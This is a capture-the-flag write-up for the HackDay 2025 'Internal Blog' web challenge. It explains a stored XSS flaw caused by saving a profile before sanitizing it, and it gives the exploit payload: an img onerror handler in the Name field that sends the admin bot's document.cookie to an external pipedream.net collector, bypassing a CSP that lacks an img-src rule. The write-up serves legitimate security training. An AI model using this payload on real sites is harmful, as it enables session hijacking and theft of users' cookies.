---
title: HackDay 2025 - Internal Blog
date: 2025-01-26
categories:
  - CTFs
  - HackDay 2025
  - Web
tags:
  - web
  - xss
description: XSS vulnerability on a blog allowed executing malicious JavaScript in the admin's account, exposing his cookie. 🍪
---
## Description 

* Category: Web 
* Vulnerability: XSS

> You’ve received an anonymous tip from the Airship Mail Delivery Company claiming that a seemingly legitimate website is actually a front for trading stolen submarine mechanical parts. Yeah, that’s oddly specific...The localhost port is 3000. Take a closer look and see if you can uncover anything suspicious. The flag to find is the bot's cookie.

[Link of the event](https://ctftime.org/event/2615)
## Enumeration 

![](assets/img_0127_0515_sstfy%201.png)
<em align="center">Admin visits posts and profil page</em>

We can also see an interesting piece of code that is shared with us:
![](assets/img_0127_0516_ernpg.png)
<em align="center">Code Leak</em>

```js
await newProfile.save()
const isXSSDetected = sanitizeJson(profileData, res);
```

The user is saved **before** XSS sanitization => Even if an XSS is detected by the server, the user will still be created.

## Exploitation

### Detecting the Vulnerability

We create an account to test XSS on the user's profile page:
```
<script>alert(document.cookie)</script>
```

![](assets/img_0127_0517_xluga.png)

=> We get the message "XSS Detected." But if we navigate to our profile page using the token, the profile is still created, and an alert pops up => **Vulnerable to XSS!** ✅

![](assets/img_0127_0518_priyt.png)

We can also notice that the `Name` field is the one vulnerable to XSS:

![](assets/img_0127_0519_cxscu.png)

### Exploitation

The blog page mentions that we need to publish an article for an admin to review our profile (where our XSS is injected!!!). So, we will create an account that sends the admin's cookie to our attacker server (using RequestBin).

We create a profile with the following JavaScript script in the `name` field:

```js
<img src=x onerror=this.src='https://eozgdsdwr0yqpzt.m.pipedream.net?cookie='+document.cookie>
```

Next, we publish an article so the admin visits our profile page. By checking the requests received on our attacker server, we can see the admin's cookie, which contains the flag! ✅

Flag : ``HACKDAY{0rd3R_M4tteRs_In_Ur_C0d3!!!!}``


> There was a Content Security Policy (CSP) directive in place:
> - `connect-src 'self' http://127.0.0.1;`
> 
> This blocks requests such as `fetch()` to other sites. However, this directive does not cover requests from `<img>` tags. To block requests made by `img` tags to other sites, an `img-src` directive or a `default-src` directive is required.
{: .prompt-info }
